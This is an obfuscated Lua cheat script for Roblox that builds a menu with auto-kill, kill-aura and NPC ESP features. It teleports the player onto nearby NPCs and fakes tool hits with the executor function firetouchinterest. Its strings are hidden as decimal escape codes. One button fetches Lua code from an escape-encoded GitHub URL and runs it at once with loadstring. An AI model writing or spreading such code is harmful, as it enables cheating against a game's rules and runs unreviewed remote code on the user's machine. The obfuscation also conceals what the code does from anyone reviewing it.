--[[ 
    BA2_REM3_CORE | AUTHENTIC SOURCE 
    OBFUSCATION: STABLE-HEX-MAP
]]

local _0x1 = game:GetService("\80\108\97\121\101\114\115")
local _0x2 = _0x1.LocalPlayer
local _0x3 = game:GetService("\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101")
local _0x4 = game:GetService("\82\117\110\83\101\114\118\105\99\101")

local _0xS = {
    AutoKill = false, KillAura = false, AuraRange = 20,
    KillDistance = 4, AttackDead = false, Visualizer = false, 
    ESP = false, ESPNames = false, RemoveUnanchored = false
}

local _0xG = Instance.new("\83\99\114\101\101\110\71\117\105")
_0xG.Name = "\66\65\50\95\82\69\77\51\95\67\79\82\69"
_0xG.ResetOnSpawn = false
_0xG.ZIndexBehavior = Enum.ZIndexBehavior.Global
local _0xP, _0xErr = pcall(function() _0xG.Parent = game:GetService("\67\111\114\101\71\117\105") end)
if not _0xP then _0xG.Parent = _0x2:WaitForChild("\80\108\97\121\101\114\71\117\105") end

local _0xM = Instance.new("\70\114\97\109\101", _0xG)
_0xM.Size = UDim2.new(0, 230, 0, 195)
_0xM.Position = UDim2.new(0.5, -115, 0.5, -97)
_0xM.BackgroundColor3 = Color3.fromRGB(15, 15, 20); _0xM.BorderSizePixel = 0; _0xM.Active = true
Instance.new("\85\73\67\111\114\110\101\114", _0xM).CornerRadius = UDim.new(0, 10)
Instance.new("\85\73\83\116\114\111\107\101", _0xM).Color = Color3.fromRGB(0, 255, 255)

local _0xR = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xG)
_0xR.Size = UDim2.new(0, 120, 0, 30); _0xR.Position = UDim2.new(0.5, -60, 0.05, 0); _0xR.Visible = false
_0xR.BackgroundColor3 = Color3.fromRGB(30, 30, 35); _0xR.Text = "\83\72\79\87\32\77\69\78\85"; _0xR.TextColor3 = Color3.fromRGB(200, 200, 200); _0xR.Font = "\83\111\117\114\99\101\83\97\110\115\66\111\108\100"
Instance.new("\85\73\67\111\114\110\101\114", _0xR).CornerRadius = UDim.new(0, 6)

local function _0xDrag(o)
    local d, ds, sp, ai
    o.InputBegan:Connect(function(i)
        if not d and (i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch) then
            d = true; ds = i.Position; sp = o.Position; ai = i
        end
    end)
    _0x3.InputChanged:Connect(function(i)
        if d and i == ai and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local dl = i.Position - ds
            o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + dl.X, sp.Y.Scale, sp.Y.Offset + dl.Y)
        end
    end)
    _0x3.InputEnded:Connect(function(i) if i == ai then d = false; ai = nil end end)
end
_0xDrag(_0xM); _0xDrag(_0xR)

local _0xH = Instance.new("\70\114\97\109\101", _0xM)
_0xH.Size = UDim2.new(1, 0, 0, 30); _0xH.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Instance.new("\85\73\67\111\114\110\101\114", _0xH)

local _0xT = Instance.new("\84\101\120\116\76\97\98\101\108", _0xH)
_0xT.Size = UDim2.new(1, -95, 1, 0); _0xT.Position = UDim2.new(0, 10, 0, 0); _0xT.Text = "\66\46\65\50\44\32\82\46\69\46\77\51"; _0xT.TextColor3 = Color3.fromRGB(0, 255, 255); _0xT.Font = "\83\111\117\114\99\101\83\97\110\115\66\111\108\100"; _0xT.BackgroundTransparency = 1; _0xT.TextXAlignment = "\76\101\102\116"

local _0xBG = Instance.new("\70\114\97\109\101", _0xH)
_0xBG.Size = UDim2.new(0, 85, 1, 0); _0xBG.Position = UDim2.new(1, -90, 0, 0); _0xBG.BackgroundTransparency = 1
local _0xBL = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", _0xBG); _0xBL.FillDirection = "\72\111\114\105\122\111\110\116\97\108"; _0xBL.HorizontalAlignment = "\82\105\103\104\116"; _0xBL.VerticalAlignment = "\67\101\110\116\101\114"

local _0xMini = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xBG); _0xMini.Size = UDim2.new(0, 20, 0, 20); _0xMini.BackgroundColor3 = Color3.fromRGB(60, 60, 60); _0xMini.Text = "\45"; _0xMini.TextColor3 = Color3.new(1,1,1); Instance.new("\85\73\67\111\114\110\101\114", _0xMini)
local _0xExit = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xBG); _0xExit.Size = UDim2.new(0, 20, 0, 20); _0xExit.BackgroundColor3 = Color3.fromRGB(200, 0, 0); _0xExit.Text = "\88"; _0xExit.TextColor3 = Color3.new(1,1,1); Instance.new("\85\73\67\111\114\110\101\114", _0xExit)

local _0xMainList = Instance.new("\70\114\97\109\101", _0xM)
_0xMainList.Position = UDim2.new(0, 10, 0, 35); _0xMainList.Size = UDim2.new(1, -20, 0, 150); _0xMainList.BackgroundTransparency = 1
local _0xMLayout = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", _0xMainList); _0xMLayout.Padding = UDim.new(0, 5)

local _0xSide = Instance.new("\70\114\97\109\101", _0xM)
_0xSide.Position = UDim2.new(1, 10, 0, 0); _0xSide.BackgroundColor3 = Color3.fromRGB(10, 10, 15); _0xSide.Visible = false
Instance.new("\85\73\67\111\114\110\101\114", _0xSide); Instance.new("\85\73\83\116\114\111\107\101", _0xSide).Color = Color3.fromRGB(0, 255, 255)

local _0xSCont = Instance.new("\70\114\97\109\101", _0xSide)
_0xSCont.Size = UDim2.new(1, -20, 1, -20); _0xSCont.Position = UDim2.new(0, 10, 0, 10); _0xSCont.BackgroundTransparency = 1
local _0xSLayout = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", _0xSCont); _0xSLayout.Padding = UDim.new(0, 6); _0xSLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function _0xUSide() _0xSide.Visible = true; _0xSide.Size = UDim2.new(0, 180, 0, _0xSLayout.AbsoluteContentSize.Y + 20) end

local function _0xTog(t, k)
    local b = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xSCont)
    b.Size = UDim2.new(1, 0, 0, 28); b.Text = t; b.BackgroundColor3 = _0xS[k] and Color3.fromRGB(0, 180, 0) or Color3.fromRGB(40, 40, 45); b.TextColor3 = Color3.new(1,1,1); Instance.new("\85\73\67\111\114\110\101\114", b)
    b.MouseButton1Click:Connect(function() _0xS[k] = not _0xS[k]; b.BackgroundColor3 = _0xS[k] and Color3.fromRGB(0, 180, 0) or Color3.fromRGB(40, 40, 45) end)
end

local _0xLT = ""
local function _0xTab(n, c)
    local b = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xMainList)
    b.Size = UDim2.new(1, 0, 0, 35); b.Text = n; b.BackgroundColor3 = Color3.fromRGB(30, 30, 35); b.TextColor3 = Color3.new(1,1,1); Instance.new("\85\73\67\111\114\110\101\114", b)
    b.MouseButton1Click:Connect(function()
        if _0xSide.Visible and _0xLT == n then _0xSide.Visible = false else
            _0xLT = n; for _, v in pairs(_0xSCont:GetChildren()) do if not v:IsA("\85\73\76\105\115\116\76\97\121\111\117\116") then v:Destroy() end end
            c(); _0xUSide()
        end
    end)
end

_0xTab("\65\85\84\79\32\75\73\76\76", function()
    local box = Instance.new("\84\101\120\116\66\111\120", _0xSCont); box.Size = UDim2.new(1,0,0,28); box.Text = "\68\105\115\116\58\32".._0xS.KillDistance; box.BackgroundColor3 = Color3.new(0,0,0); box.TextColor3 = Color3.new(1,1,1); Instance.new("\85\73\67\111\114\110\101\114", box)
    box.FocusLost:Connect(function() _0xS.KillDistance = tonumber(box.Text:match("\37\100\43")) or 4; box.Text = "\68\105\115\116\58\32".._0xS.KillDistance end)
    _0xTog("\69\110\97\98\108\101\32\65\117\116\111\32\75\105\108\108", "\65\117\116\111\75\105\108\108")
end)

_0xTab("\75\73\76\76\32\65\85\82\65", function()
    _0xTog("\69\110\97\98\108\101\32\65\117\114\97", "\75\105\108\108\65\117\114\97")
    _0xTog("\65\116\116\97\99\107\32\68\101\97\100", "\65\116\116\97\99\107\68\101\97\100")
    _0xTog("\86\105\115\117\97\108\105\122\101\114", "\86\105\115\117\97\108\105\122\101\114")
end)

_0xTab("\85\83\69\70\85\76", function()
    local npc = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xSCont); npc.Size = UDim2.new(1,0,0,28); npc.Text = "\78\80\67\32\67\111\110\116\114\111\108\108\101\114"; npc.BackgroundColor3 = Color3.fromRGB(100, 0, 200); npc.TextColor3 = Color3.new(1,1,1); Instance.new("\85\73\67\111\114\110\101\114", npc)
    npc.MouseButton1Click:Connect(function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\114\97\110\100\111\109\115\116\114\105\110\103\48\47\102\101\45\115\111\117\114\99\101\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\78\80\67\47\115\111\114\99\101\47\109\97\105\110\46\76\117\97\117"))() end)
    _0xTog("\78\80\67\32\69\83\80", "\69\83\80")
end)

local _0xCache = {}
task.spawn(function()
    while task.wait(0.5) do
        local n = {}
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("\72\117\109\97\110\111\105\100") and v.Parent ~= _0x2.Character and not _0x1:GetPlayerFromCharacter(v.Parent) then table.insert(n, v.Parent) end
        end
        _0xCache = n
    end
end)

_0x4.Heartbeat:Connect(function()
    local c = _0x2.Character; local r = c and c:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116")
    if not r then return end
    local near, mD = nil, math.huge
    for _, npc in pairs(_0xCache) do
        local nR = npc:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or npc:FindFirstChild("\72\101\97\100")
        if nR then
            local d = (nR.Position - r.Position).Magnitude
            if d < mD then mD = d; near = npc end
            if _0xS.ESP then
                local h = npc:FindFirstChild("\69\83\80\72") or Instance.new("\72\105\103\104\108\105\103\104\116", npc); h.Name = "\69\83\80\72"; h.FillColor = Color3.new(1,0,0)
            end
        end
    end
    if near then
        local nR = near:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or near:FindFirstChild("\72\101\97\100")
        if _0xS.AutoKill and mD < 500 then r.CFrame = nR.CFrame * CFrame.new(0, _0xS.KillDistance, 0) * CFrame.Angles(math.rad(-90), 0, 0) end
        if _0xS.KillAura and mD <= _0xS.AuraRange then
            local t = c:FindFirstChildOfClass("\84\111\111\108")
            if t and t:FindFirstChild("\72\97\110\100\108\101") then t:Activate(); firetouchinterest(t.Handle, nR, 0); firetouchinterest(t.Handle, nR, 1) end
        end
    end
end)

_0xMini.MouseButton1Click:Connect(function() _0xM.Visible = false; _0xSide.Visible = false; _0xR.Visible = true end)
_0xR.MouseButton1Click:Connect(function() _0xM.Visible = true; _0xR.Visible = false end)
_0xExit.MouseButton1Click:Connect(function() _0xG:Destroy() end)
